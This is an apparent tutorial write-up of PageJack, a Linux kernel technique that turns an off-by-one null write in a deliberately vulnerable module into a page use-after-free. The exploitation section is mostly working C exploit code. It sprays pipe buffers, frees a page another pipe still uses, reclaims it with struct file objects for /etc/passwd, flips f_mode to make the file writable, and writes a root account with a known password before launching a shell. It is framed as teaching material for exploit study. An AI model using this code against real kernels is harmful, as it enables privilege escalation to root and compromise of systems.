In this post, I will explain PageJack, a universal and data-only exploitation technique that turns an off-by-one-null into a page UAF. Download the [handouts](https://github.com/r1ru/linux-kernel-exploitation/tree/main/pagejack) beforehand.

## Analysis
The vulnerable LKM provides two commands: `CMD_ALLOC` and `CMD_WRITE`. These commands are used to allocate and write to an object defined as follows:
```c
#define OBJ_SIZE    0x400

struct obj {
    char buf[OBJ_SIZE];
};
```

## Bugs
There is an obvious off-by-one null bug in `obj_write`:
```c
static long obj_write(char *data, size_t size) {
    if (obj == NULL || size > OBJ_SIZE) {
        return -1;
    }
    if (copy_from_user(obj->buf, data, size) != 0) {
        return -1;
    }
    obj->buf[size] = '\0';
    return 0;
}
```

## PageJack
PageJack is a technique that turns an off-by-one null bug into a page UAF. It targets the array of `struct pipe_buffer` allocated in `alloc_pipe_buf`:
```c
// https://elixir.bootlin.com/linux/v6.13/source/fs/pipe.c#L815-L816
struct pipe_inode_info *alloc_pipe_info(void)
{
    struct pipe_inode_info *pipe;
    unsigned long pipe_bufs = PIPE_DEF_BUFFERS;
    ...
    pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),
                 GFP_KERNEL_ACCOUNT);
    ...
}
```
`struct pipe_buffer` has a pointer to a struct page as its first member:
```c
// https://elixir.bootlin.com/linux/v6.13/source/include/linux/pipe_fs_i.h#L26-L32
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};
```
Since `struct page` is 0x40 bytes and we have an off-by-one-null primitive, we can overwrite the pointer to point to a different page with a 75% chance. Then, by closing the pipe, we can free a page that another pipe is using. This lets us trigger a page UAF.

PageJack is a very powerful technique that can bypass mitigations like `CONFIG_CFI_CLANG` and the upcoming [`CONFIG_SLAB_VIRTUAL`](https://github.com/thejh/linux/blob/slub-virtual/MITIGATION_README).

## Exploitation
First, we allocate the victim object near `struct pipe_buffer`:
```c
puts("[*] Spraying struct pipe_buffer");
int pipefds[NUM_PIPE_SPRAY][2];
for (int i = 0; i < NUM_PIPE_SPRAY / 2; i++) {
    assert(pipe(pipefds[i]) != -1);
}

puts("[*] Allocating a victim object from kmalloc-1k");
obj_alloc();

puts("[*] Spraying struct pipe_buffer");
for (int i = NUM_PIPE_SPRAY / 2; i < NUM_PIPE_SPRAY; i++) {
    assert(pipe(pipefds[i]) != -1);
}
```
Next, we write values to the allocated pipes. This is necessary in a later step to identify the victim pipe:
```c
puts("[*] Writting to pipes to allocate pages");
for (int i = 0; i < NUM_PIPE_SPRAY; i++) {
    int val = 0xcafebabe + i;
    assert(write(pipefds[i][1], &val, sizeof(val)) != -1);
    assert(write(pipefds[i][1], "deadbeef", 8) != -1);
}
```
There are two reasons why we additionally write "deadbeef". The first reason is to prevent the page from being freed when we later read 4 bytes. If only 4 bytes were written, `anon_pipe_buf_release` would be called in `pipe_read`, causing the page to be freed:
```c

// https://elixir.bootlin.com/linux/v6.13/source/fs/pipe.c#L343-L344
static ssize_t
pipe_read(struct kiocb *iocb, struct iov_iter *to)
{
    ...
            if (!buf->len)
                tail = pipe_update_tail(pipe, buf, tail);
```

The second reason is to overwrite the `f_mode` member of `struct file` in the final step.
Since `pipe_write` writes from `len + offset`, and the offset of the `f_mode` member is 0xc, we adjust the write position:
```c
// https://elixir.bootlin.com/linux/v6.13/source/fs/pipe.c#L477-L485
static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
    ...
        int offset = buf->offset + buf->len;

        if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
            offset + chars <= PAGE_SIZE) {
            ret = pipe_buf_confirm(pipe, buf);
            if (ret)
                goto out;

            ret = copy_page_from_iter(buf->page, offset, chars, from);
```

Next, we trigger the off-by-one-null:
```c
puts("[*] Overwitting pipe->bufs[0].page");
char zero[0x400] = {};
obj_write(zero, 0x400);
```
Next, we identify the victim pipe by reading from the pipe and checking if the value differs from the one we wrote:
```c
puts("[*] Locating the victim pipe");
int victim_pipefd = -1;
int origin_pipefd = -1;
for (int i = 0; i < NUM_PIPE_SPRAY; i++) {
    int val;

    assert(read(pipefds[i][0], &val, 4) != -1);
    if (val != 0xcafebabe + i) {
        victim_pipefd = i;
        origin_pipefd = val - 0xcafebabe;
        printf("[+] Found: victim_pipefd = %d, origin_pipefd = %d\n", victim_pipefd, origin_pipefd);
        break;
    }
}
if (victim_pipefd == -1) {
    puts("[-] Failed to locate the victim pipe");
    exit(0);
}
```
Next, we close one of the pipes that shares the same pointer to the page:
```c
puts("[*] Closing the original pipe");
assert(close(pipefds[origin_pipefd][0]) != -1);
assert(close(pipefds[origin_pipefd][1]) != -1);
```
Next, we spray `struct file` objects for `/etc/passwd` to make the freed page be used as a slab in the `filp` cache:
```c
puts("[*] Spraying struct file of /etc/passwd");
int filefds[NUM_SPRAY_FILE];
for (int i = 0; i < NUM_SPRAY_FILE; i++) {
    filefds[i]= open("/etc/passwd", O_RDONLY);
    assert(filefds[i] != -1);
}
```
Finally, we use the victim pipe to overwrite the `f_mode` member, making `/etc/passwd` writable, and then overwrite it.
```c
puts("[*] Overwitting f_mode");
int fake_f_mode = 0x84f801f;
assert(write(pipefds[victim_pipefd][1], &fake_f_mode, 4) != -1);

char payload[] = "root:$1$deadbeef$j9ep0CjBGivAnD5z6l5rr0:0:0:root:/root:/bin/sh\n";
printf("[*] Overwriting /etc/passwd with %s", payload);
for (int i = 0; i < NUM_SPRAY_FILE; i++) {
    if (write(filefds[i], payload, sizeof(payload)) != -1) {
        puts("[+] Success");
        puts("[+] You can now log in as root with the password: cafebabe");
        char *argv[] = {"/bin/sh", NULL};
        execve(argv[0], argv, NULL);
    }
}
```
By running this exploit, we can log in as a root user with the password `cafebabe` and see the flag:
